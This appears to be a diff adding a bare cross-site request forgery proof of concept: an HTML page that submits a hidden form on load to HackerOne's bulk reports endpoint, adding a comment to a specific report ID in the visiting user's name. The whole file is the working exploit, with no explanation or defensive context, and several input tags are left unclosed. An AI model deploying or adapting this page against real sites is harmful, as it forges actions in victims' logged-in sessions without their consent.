@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <script>
+        function submitForms() {
+            document.forms['csrf'].submit();
+            
+            return false;
+        }
+    </script>
+
+</head>
+<body  onload="submitForms();">
+
+    <form method="post" name="csrf"  action="https://hackerone.com/reports/bulk" >
+    
+        <input type="hidden" id="message" name="message" value="testing+comment+worked" 
+        <input type="hidden" id="substate" name="substate" value="" 
+        <input type="hidden" id="is_internal" name="is_internal" value="false" 
+        <input type="hidden" id="reference" name="reference" value="" 
+        <input type="hidden" id="add_reporter_to_original" name="add_reporter_to_original" value="false" 
+        <input type="hidden" id="reply_action" name="reply_action" value="add-comment" 
+        <input type="hidden" id="mark_ineligible_for_bounty" name="mark_ineligible_for_bounty" value="false" 
+        <input type="hidden" id="unassign_report_on_close" name="unassign_report_on_close" value="false" 
+        <input type="hidden" id="code_review_patch" name="code_review_patch" value="" 
+        <input type="hidden" id="code_review_diff_url" name="code_review_diff_url" value="" 
+        <input type="hidden" id="reports_count" name="reports_count" value="1" 
+        <input type="hidden" id="report_ids%5B%5D" name="report_ids%5B%5D" value="2211657" 
+        <input type="hidden" id="bounty_currency" name="bounty_currency" value="USD" 
+
+
+    </form>
+
+</body>
+</html>
